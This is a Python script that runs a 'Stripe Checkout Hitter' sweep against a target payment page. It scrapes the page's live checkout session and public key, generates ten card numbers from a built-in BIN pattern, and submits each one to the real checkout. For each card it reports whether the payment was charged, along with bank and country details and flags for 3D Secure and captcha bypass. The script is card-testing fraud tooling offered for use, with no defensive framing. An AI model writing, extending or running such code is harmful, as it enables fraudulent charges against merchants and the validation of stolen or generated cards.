import sys
import json
import asyncio
import aiohttp
import os

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

# Force UTF-8 output on Windows (cp1252 can't encode ─ ➜ ✅ ❌ 🔐)
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

from engines.stripe_hitter import (
    StripeAPIHitter, StripeAPIExtractor, CardGenerator, BINLookup,
)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"


async def _fetch_session_info(url: str):
    """Fetch page + init_json once per sweep. Returns (cs_live, pk_live, init_json, stripe_account, locked_email, raw_amount, site_domain)."""
    clean_fetch_url = url.split("#")[0] if "#" in url else url

    async with aiohttp.ClientSession() as sess:
        hdr = {"User-Agent": UA, "Accept": "text/html,*/*"}
        async with sess.get(clean_fetch_url, headers=hdr,
                            timeout=aiohttp.ClientTimeout(total=30)) as r:
            html = await r.text()
            final_url = str(r.url)

        cs_live = StripeAPIExtractor.extract_cs_live(final_url, html)
        pk_live = StripeAPIExtractor.extract_pk_live(html)

        hash_info = StripeAPIExtractor.extract_details_from_url_hash(url)
        hash_pk = hash_info.get('pk_key')
        stripe_account = hash_info.get('stripe_account')
        if hash_pk and hash_pk.startswith('pk_live_'):
            pk_live = hash_pk

        if not cs_live or not pk_live:
            return None, None, {}, None, None, None, None

        init_json = {}
        if cs_live.startswith('cs_'):
            try:
                init_url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
                init_data = f"key={pk_live}&eid=NA&browser_locale=en-US"
                if stripe_account:
                    init_data += f"&account={stripe_account}"
                hdr_init = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA}
                async with sess.post(init_url, data=init_data, headers=hdr_init, timeout=8) as ir:
                    init_json = await ir.json()
                    if not isinstance(init_json, dict):
                        init_json = {}
            except Exception:
                pass

        locked_email = None
        if init_json:
            locked_email = (
                init_json.get('customer_email')
                or init_json.get('prefilled_email')
                or init_json.get('email')
                or (init_json.get('customer') or {}).get('email')
                or (init_json.get('customer_details') or {}).get('email')
            )

        ts = init_json.get('total_summary') if init_json else None
        raw_amount = ts.get('total') if isinstance(ts, dict) else None
        if raw_amount is None and init_json:
            raw_amount = (
                (init_json.get('invoice') or {}).get('amount_due')
                or (init_json.get('payment_intent') or {}).get('amount')
            )

        return cs_live, pk_live, init_json, stripe_account, locked_email, raw_amount, final_url


async def run_single_card(url: str, session_info: dict, card_str: str, index: int):
    parts = card_str.split("|")
    card_dict = {
        "card": parts[0],
        "month": parts[1],
        "year": parts[2],
        "cvv": parts[3],
    }

    striker = StripeAPIHitter(
        pk_live=session_info["pk_live"],
        cs_live=session_info["cs_live"],
        proxy_data=None,
        raw_amount=session_info["raw_amount"],
        locked_email=session_info["locked_email"],
        stripe_account=session_info["stripe_account"],
        init_json=session_info["init_json"],
        full_page_url=url,
    )

    res = await striker.hit(card_dict, attempt=1, user_id=0)

    bin_info = await BINLookup.lookup(parts[0])

    success = res.get('success', False)
    dec_code = res.get('decline_code') or ''
    merchant = res.get('merchant') or 'Unknown'
    amount = res.get('amount') or 'N/A'
    bank = bin_info.get('bank') or 'Unknown'
    country = f"{bin_info.get('country_name', '')} ({bin_info.get('country', '??')})".strip(" ()")
    card_type = bin_info.get('type') or 'Unknown'
    card_brand = bin_info.get('brand') or 'Unknown'

    raw = res.get('raw_response') or {}
    if isinstance(raw, str):
        try:
            raw = json.loads(raw)
        except Exception:
            raw = {}
    err_obj = raw.get('error') or {}
    msg = err_obj.get('message') or res.get('message') or dec_code or 'No message'

    tds_attempted = res.get('3ds_attempted', False)
    tds_bypassed = res.get('3ds_bypassed', False)
    tds_type = res.get('3ds_type') or 'none'
    cap_bypassed = res.get('captcha_bypassed', False)
    confirm_url = res.get('confirm_url') or res.get('receipt_url') or ''

    site_domain = res.get('site_domain')
    site_str = f"{merchant} ({site_domain})" if site_domain else merchant

    print("\nStripe Checkout Hitter\n")
    print(f"[{index+1}] {card_str}")
    print(f"Site: {site_str}")
    print(f"Amount: {amount}")
    print(f"BIN: {card_brand} {card_type} — {bank} — {country}")

    if success:
        print("Status: Payment successful  \u2705")
        print(f"Message: {amount} Charged!")
        if confirm_url:
            print(f"\nConfirmUrl: {confirm_url}")
    else:
        print("Status: Payment declined  \u274c")
        print(f"Message: {msg}")

    diag_data = {
        "card": card_str,
        "merchant": merchant,
        "site_domain": site_domain,
        "status": "succeeded" if success else "declined",
        "decline_code": dec_code,
        "message": msg,
        "3ds_attempted": tds_attempted,
        "3ds_bypassed": tds_bypassed,
        "3ds_type": tds_type,
        "captcha_bypassed": cap_bypassed,
        "confirm_url": confirm_url if confirm_url else None,
        "raw_stripe_response": raw if isinstance(raw, dict) else str(raw)[:500],
    }
    print("\nDiagnostic JSON:")
    print(json.dumps(diag_data, indent=2))
    print("")
    return res


async def main():
    if len(sys.argv) < 2:
        print("Usage: python sweep_runner.py <url> [card_pattern]")
        return

    url = sys.argv[1]
    card_pattern = "415464440233xxxxx|05|28|378"
    if len(sys.argv) > 2:
        card_pattern = sys.argv[2]

    print("=== STARTING 10-CARD SWEEP ===")
    print(f"Target URL: {url[:80]}...")
    print(f"Card Pattern: {card_pattern}\n")

    # Hoisted session info — one page fetch + one init call per sweep
    cs_live, pk_live, init_json, stripe_account, locked_email, raw_amount, final_url = \
        await _fetch_session_info(url)

    if not cs_live or not pk_live:
        print(f"ERROR: extraction failed cs={bool(cs_live)} pk={bool(pk_live)}")
        return

    print(f"cs_live: {cs_live[:24]}...")
    print(f"pk_live: {pk_live[:24]}...")
    print(f"raw_amount: {raw_amount}")
    print(f"locked_email: {locked_email or '-'}\n")

    session_info = {
        "cs_live": cs_live,
        "pk_live": pk_live,
        "init_json": init_json,
        "stripe_account": stripe_account,
        "locked_email": locked_email,
        "raw_amount": raw_amount,
    }

    generated_cards = []
    for _ in range(10):
        c_data = CardGenerator.generate(card_pattern)
        if c_data:
            generated_cards.append(
                f"{c_data['card']}|{c_data['month']}|{c_data['year']}|{c_data['cvv']}"
            )

    for idx, card in enumerate(generated_cards):
        res = await run_single_card(url, session_info, card, idx)
        if res and isinstance(res, dict):
            dec_code = res.get("decline_code") or ""
            err_msg = str(res.get("error") or "").lower()
            if (dec_code in ("checkout_not_active_session", "checkout_succeeded_session")
                    or "no longer active" in err_msg
                    or "already been processed" in err_msg):
                print("\n[!] FATAL: Stripe Checkout Session is expired or already completed. Terminating sweep.")
                break
        await asyncio.sleep(1)

    print("\n=== SWEEP COMPLETED ===")


if __name__ == '__main__':
    asyncio.run(main())